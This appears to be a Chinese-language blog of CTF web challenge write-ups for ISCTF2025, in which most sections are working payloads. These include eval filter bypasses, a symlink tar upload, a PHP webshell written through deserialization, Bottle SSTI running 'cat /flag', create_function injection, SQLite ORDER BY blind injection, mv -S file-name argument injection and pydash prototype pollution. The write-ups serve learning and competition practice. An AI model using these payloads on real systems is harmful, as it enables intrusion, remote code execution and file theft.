---
title: ISCTF2025
date: 2026-02-03 22:46:56
tags:
index_img: https://gz.imxbt.cn/assets/266c511a0f2b146dc57c73e0ad482f45ac24e95b64eb1087392c7da197eb9048/poster
categories: CTF
---

## ezrce

```php
<?php
highlight_file(__FILE__);

if(isset($_GET['code'])){
    $code = $_GET['code'];
    if (preg_match('/^[A-Za-z\(\)_;]+$/', $code)) {
        eval($code);
    }else{
        die('师傅，你想拿flag？');
    }
}
```

只允许使用字母和一部分符号，先找到flag的位置 在根目录

```
print_r(scandir(dirname(dirname(dirname(getcwd())))));
```

数组但是用不了数字，而且只能返回文件名，所以先进入根目录再随机读取，多刷新几次就出来了

```
?code=chdir(dirname(dirname(dirname(getcwd()))));show_source(array_rand(array_flip(scandir(getcwd()))));
```

## flag？我就借走了

上来就是一个上传，还提示我会解压到目录，直接考虑软链接

```
ln -s /flag hack
tar -cvf exp.tar hack
```

![](https://gitee.com/bobrocket/img/raw/master/6982bedc67f4587158b9fd77.png)

#### 参考文献

[软连接在CTF的应用](https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E9%80%9A%E7%94%A8/35/)

## b@by n0t1ce b0ard

考察CVE复现

![](https://gitee.com/bobrocket/img/raw/master/img/image-20260204130727800.png)

查询漏洞库发现registration.php有漏洞，审计代码

```
//upload image

mkdir("images/$e");
move_uploaded_file($_FILES['img']['tmp_name'],"images/$e/".$_FILES['img']['name']);


$err="<font color='blue'>Registration successfull !!</font>";

}
}
```

上传代码这里没有校验文件后缀名，直接上传一句话木马即可

## 难过的bottle

某人一个一个打包测试了一个多小时最后发现给了源码(QAQ)

注意注意！本题不是jinja2模版而是bottle，ssti注入有差别

```python
BLACKLIST = ["b","c","d","e","h","i","j","k","m","n","o","p","q","r","s","t","u","v","w","x","y","z","%",";",",","<",">",":","?"]
 try:
        return template(content)
    except Exception as e:
        return f"渲染错误: {str(e)}"
```

它对上传的文件解压后进行渲染，可以从这里注入

大部分字母全过滤了，刚好剩一个flag，关键字用全角绕过

```
{{ｏｐｅｎ('/flag').ｒｅａｄ()}}
```

也可以斜体绕过

#### 补充——八进制绕过

```
{{ __ｉｍｐｏｒｔ__('\157\163').ｐｏｐｅｎ('\143\141\164\040\057\146\154\141\147').ｒｅａｄ() }}
```

即:

```
{{__import__('os').popen('cat /flag').read()}}
```

#### 参考文献

[♪(^∇^*)欢迎肥来！Python Bottle SSTI注入 | Jatopos的博客](https://jatopos.github.io/2025/10/05/Python Bottle SSTI注入/#python3-bottle框架斜体字引发的ssti模板注入)

## 来签个到吧

这种php反序列化还是第一次见

首先审计代码 index.php

```php
<?php
require_once "./config.php";
require_once "./classes.php";

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $s = $_POST["shark"] ?? '喵喵喵?';

    if (str_starts_with($s, "blueshark:")) { #必须要以blueshark:开头
        $ss = substr($s, strlen("blueshark:")); #这里就把前面的开头截掉了，吓死了一开始还以为是字符串逃逸

        $o = @unserialize($ss);

        $p = $db->prepare("INSERT INTO notes (content) VALUES (?)");
        $p->execute([$ss]);

        echo "save sucess!";
        exit(0);
    } else {
        echo "喵喵喵?";
        exit(1);
    }
}
```

class.php

```php
<?php
class FileLogger {
    public $logfile = "/tmp/notehub.log";
    public $content = "";

    public function __construct($f=null) {
        if ($f) {
            $this->logfile = $f;
        }
    }

    public function write($msg) {
        $this->content .= $msg . "\n";
        file_put_contents($this->logfile, $this->content, FILE_APPEND);
    }

    public function __destruct() {
        if ($this->content) {
            file_put_contents($this->logfile, $this->content, FILE_APPEND);
        }
    }
}

class ShitMountant {
    public $url;
    public $logger;

    public function __construct($url) {
        $this->url = $url;
        $this->logger = new FileLogger();
    }

    public function fetch() {
        $c = file_get_contents($this->url); //读取文件
        if ($this->logger) {
            $this->logger->write("fetched ==> " . $this->url); //写入文件
        }
        return $c;
    }

    public function __destruct() {
        $this->fetch();
    }
}
```

api.php

```php
<?php
require_once "./config.php";
require_once "./classes.php";

$id = $_GET["id"] ?? '喵喵喵?';

$s = $db->prepare("SELECT content FROM notes WHERE id = ?");
$s->execute([$id]);
$row = $s->fetch(PDO::FETCH_ASSOC);

if (! $row) {
    die("喵喵喵?");
}

$cfg = unserialize($row["content"]);

if ($cfg instanceof ShitMountant) {
    $r = $cfg->fetch();
    echo "ok!" . "<br>";
    echo nl2br(htmlspecialchars($r));
}
else {
    echo "喵喵喵?";
}
```

所以思路就是利用反序列化写入木马

```php
<?php
class FileLogger {
    public $logfile;
    public $content;

}

class ShitMountant {
    public $url;
    public $logger;

    public function __construct($url) {
        $this->url = $url;
        $this->logger = new FileLogger("/var/www/html/shell.php");
    }
}
$shi = new ShitMountant("<?php eval(\$_POST['cmd']); ?>");
echo serialize($shi);
//O:12:"ShitMountant":1:{s:3:"url";s:5:"/flag";}
```

还有一种做法是url=/flag，然后用api.php读取结果，但是不是很理解为什么能读到

## Bypass

```php
<?php
class FLAG
{
    private $a;
    protected $b;
    public function __construct($a, $b)
        {
            $this->a = $a;
            $this->b = $b;
            $this->check($a,$b);
            eval($a.$b);
        }
    public function __destruct(){
            $a = (string)$this->a;
            $b = (string)$this->b;
            if ($this->check($a,$b)){
                $a("", $b); //关键代码
            }
            else{
                echo "Try again!";
            }
        }
    private function check($a, $b) {
        $blocked_a = ['eval', 'dl', 'ls', 'p', 'escape', 'er', 'str', 'cat', 'flag', 'file', 'ay', 'or', 'ftp', 'dict', '\.\.', 'h', 'w', 'exec', 's', 'open'];
        $blocked_b = ['find', 'filter', 'c', 'pa', 'proc', 'dir', 'regexp', 'n', 'alter', 'load', 'grep', 'o', 'file', 't', 'w', 'insert', 'sort', 'h', 'sy', '\.\.', 'array', 'sh', 'touch', 'e', 'php', 'f'];

        $pattern_a = '/' . implode('|', array_map('preg_quote', $blocked_a, ['/'])) . '/i';
        $pattern_b = '/' . implode('|', array_map('preg_quote', $blocked_b, ['/'])) . '/i';

        if (preg_match($pattern_a, $a) || preg_match($pattern_b, $b)) {
            return false;
        }
        return true;
    }  
}


if (isset($_GET['exp'])) {
    $p = unserialize($_GET['exp']);
    var_dump($p);
}else{
    highlight_file("index.php");
}
```

过滤实在太恐怖，没啥思路，贴一下wp

这里联想到creat_function，抓包看下php版本（create_function在php7.3中被废弃，在php8.0中被移除，所以php版本十分重要）：

这里是php7.1，那就是这个方法了

我们先看看create_function的实现是怎么样的：

```php
function create_function($args, $code) {
    $virtual_code = "function lambda_func($args) { $code }"; 
    eval($virtual_code);
}
```

从中我们可以看出，这个函数实际上是创建了一个匿名函数，放入eval中执行命令，这给了我们极大的构造空间

第一个参数可以不传，表示方法不需要传入值，第二个参数构造}闭合掉匿名函数，;开启下个命令，//注释掉后面的}"，就可以开始操作了

我们构造};system('ls /');//，但是这里对$b有过滤，我们使用8进制绕过（16进制也行，但是c会被waf，异或一下也能写）

```php
<?php
class FLAG
{
    private $a;
    protected $b;
    public function __construct($a, $b)
    {
        $this->a = $a;
        $this->b = $b;
    }
}

$a = "create_function";

// 转八进制函数：
function str8($string) {
    $c = "";
    for ($i = 0; $i < strlen($string); $i++) {
        $c .= "\\" . decoct(ord($string[$i]));
    }
    return $c;
}

$s_system = str8("system"); 
$s_cmd = str8("cat /flag");

$payload_b = '} $v="' . $s_system . '"; $v("' . $s_cmd . '");/*';

$flag = new FLAG($a, $payload_b);
$payload = serialize($flag);

echo "?exp=" . urlencode($payload);
?>
```

## kaqiWeaponShop

又是知识盲区，考察SQLite数据库和order by盲注

首先测试注入位置

```
1，返回编号 1；
0，⽆返回；
id，正常返回；
-id，倒序返回；
1 desc，倒序返回
```

也就是说SQL语句大概率是这样的

```sqlite
SELECT 字段 FROM 表 WHERE 条件 ORDER BY [你传入的参数] LIMIT 1;
```

怎样测是什么数据库？

```sql
(SELECT typeof(1))='1'，返回正常⻚⾯，sqlite 专有函数。
(SELECT date('now'))>'' ，返回正常，sqlite。
(SELECT version())>''，返回错误，MySQL/PG 专有函数。
(SELECT sleep(1)) IS NULL，返回错误，MySQL 专有。

# SQL 标准通⽤
"select", "insert", "update", "delete", "create", "drop", "alter",
"from", "where", "group", "by", "having", "order", "asc", "desc",
"and", "or", "not", "null", "is", "in", "exists", "between",
"case", "when", "then", "else", "end",
"union", "all", "distinct", "into", "values", "set", "join",
"inner", "left", "right", "full", "outer", "cross", "on",
"as", "like", "limit", "offset", "top",

# SQLite 特有
"sqlite_master", "pragma", "autoincrement", "rowid",
"randomblob", "zeroblob", "strftime", "date", "time",
"datetime", "julianday",

# MySQL 特有
"auto_increment", "engine", "show", "explain", "describe",
"database", "databases", "if", "else", "elseif", "elseif",
"sleep", "benchmark", "now", "curdate", "date_format",

# PostgreSQL 特有
"serial", "bigserial", "text", "boolean",
"ilike", "similar", "to", "overlaps",
"returning", "with", "recursive",
"pg_sleep", "extract", "interval",

# SQL Server 特有
"identity", "nvarchar", "nchar", "bit", "money",
"uniqueidentifier", "isnull", "len", "getdate",
"row_number", "over", "partition",

# Oracle 特有
"dual", "rownum", "connect", "start", "with", "prior",
"sysdate", "systimestamp", "nvl", "decode", "rank", "over",

# 常⻅函数关键字（多数数据库都保留）
"abs", "substr", "substring", "length", "char_length",
"lower", "upper", "replace", "trim", "coalesce",
"ifnull", "isnull", "cast", "convert","avg", "sum", "min", "max", "count",
```

下面就是order by盲注了

```sql
CASE WHEN ((SELECT substr(flag, 1, 1) FROM flag) = 'f') THEN -id ELSE id END
```

但是发现like和=被过滤了，那么就是二分法查询了

## ezpop

```php
<?php
error_reporting(0);

class begin {
    public $var1;
    public $var2;

    function __construct($a)
    {
        $this->var1 = $a;
    }
    function __destruct() {
        echo $this->var1;
    }

    public function __toString() {
        $newFunc = $this->var2;
        return $newFunc();
    }
}


class starlord {
    public $var4;
    public $var5;
    public $arg1;

    public function __call($arg1, $arg2) {
        $function = $this->var4;
        return $function();
    }

    public function __get($arg1) {
        $this->var5->ll2('b2');
    }
}

class anna {
    public $var6;
    public $var7;

    public function __toString() {
        $long = @$this->var6->add();
        return $long;
    }

    public function __set($arg1, $arg2) {
        if ($this->var7->tt2) {
            echo "yamada yamada";
        }
    }
}

class eenndd {
    public $command;

    public function __get($arg1) {
        if (preg_match("/flag|system|tail|more|less|php|tac|cat|sort|shell|nl|sed|awk| /i", $this->command)){
            echo "nonono";
        }else {
            eval($this->command);
        }
    }
}

class flaag {
    public $var10;
    public $var11="1145141919810";

    public function __invoke() {
        if (md5(md5($this->var11)) == 666) {
            return $this->var10->hey;
        }
    }
}


if (isset($_POST['ISCTF'])) {
    unserialize($_POST["ISCTF"]);
}else {
    highlight_file(__FILE__);
}
```

链子比较简单，md5弱比较写个小脚本也就跑出来了

```php
<?php
error_reporting(0);

class begin {
    public $var1;
    public $var2;

}


class starlord {
    public $var4;
    public $var5;
    public $arg1;

}

class anna {
    public $var6;
    public $var7;

}

class eenndd {
    public $command;

}

class flaag {
    public $var10;
    public $var11="1145141919810";

}

//begin -> begin -> flaag -> eenndd

$a = new begin();
$a -> var1 = new begin();
$a -> var1 -> var2 = new flaag();
$a -> var1 -> var2 -> var11 = 213;
$a -> var1 -> var2 -> var10 = new eenndd();
$a -> var1 -> var2 -> var10 -> command = "passthru('strings\t/f*');";
echo urlencode(serialize($a));
```

一开始我想到的payload是

```
command="highlight_file(glob(\"/f*\")[0]);";
```

一定要注意  \  转义或者内部使用单引号

## mv_upload

考察mv操作符和恶意文件名构造

dirsearch扫一下目录，发现vim源码泄露

![image-20260205165516902](https://gitee.com/bobrocket/img/raw/master/img/image-20260205165516902.png)

关键代码

```php
exec("cd $uploadDir ; mv * $targetDir 2>&1", $output, $returnCode);
```

![image-20260205214956593](https://gitee.com/bobrocket/img/raw/master/img/image-20260205214956593.png)

这里考察的是-S操作符，对于已经存在的文件，-S操作符会替换备份文件的后缀（可指定），从而达到构造恶意php文件，从而getshell

所以就要构造这样的命令

```
mv -S php t. /var/www/html/upload/
```

先上传.t文件，内容是木马

再依次上传-S，php，t.的空文件即可

## Who am I

没有系统学过原型链污染，照着wp做了一下

首先登录修改post中type的值进入管理员后台查看源码

分析源码，发现两处漏洞

1.原型链污染

```python
@app.route('/operate',methods=['GET'])
def operate():
    username=request.args.get('username')
    password=request.args.get('password')
    confirm_password=request.args.get('confirm_password')
    if username in globals() and "old" not in password:
        Username=globals()[username]
        try:
            pydash.set_(Username,password,confirm_password)
            return "oprate success"
        except:
            return "oprate failed"
    else:
        return "oprate failed"
```

其中的`globals()`返回当前模块中所有全局变量的字典，在`Flask`应用中，最重要的全局变量通常是`app`.

`pydash.set_()`：

- `pydash`是Python版的`lodash`。`lodash`是JS里一个处理数据的第三方库，主打一个方便，其中`_.get`可以安全取值，`_.set`可以深层赋值，后者允许你用字符串路径来修改值。（这很夸张，比如写

  `_.set(obj,'a.b.c','value')`，他会自动找到a下面的b下面的c，再赋值）其中最著名的漏洞就是原型链污染（Prototype Pollution），你可以通过`_.set`传入`__proto.isAdmin`，修改所有对象的基类，让所有用户变成管理员。

- `pydash`的写法稍有不同：
  从python本来的`app.jinja_loader.searchpath = "/"`到
  `pydash.set_(app,'jinja_loader.searchpath','/')`。他接收三个参数，以这题为例:

  ![image-20251208210948671](https://gitee.com/bobrocket/img/raw/master/img/image-20251208210948671.png)

- `Username`是对象，`password`是路径，`confirm_password`是值。

我们给`username`赋值`app`（`app`对象是由`Flask(__name__)`生成的实例，存着所有的配置），改app相当于在修改服务器的运行规则。

![image-20251208212025293](https://gitee.com/bobrocket/img/raw/master/img/image-20251208212025293.png)

我们给`password`赋值`jinja_loader.searchpath`，再将`value`篡改为`/`，这样调用`render_template()`函数时，Flask就会默认去根目录找文件。

2.任意模版渲染

```python
@app.route('/impression',methods=['GET'])
def impression():
    point=request.args.get('point')
    if len(point) > 5:
        return "Invalid request"
    List=["{","}",".","%","<",">","_"]
    for i in point:
        if i in List:
            return "Invalid request"
    return render_template(point)
```

那么前面已经到根目录了，这里可以直接渲染flag

```
/operate?username=app&password=jinja_loader.searchpath&confirm_password=/
/impression?point=flag
```

#### 补充——WAF

![image-20260205220236495](https://gitee.com/bobrocket/img/raw/master/img/image-20260205220236495.png)

  

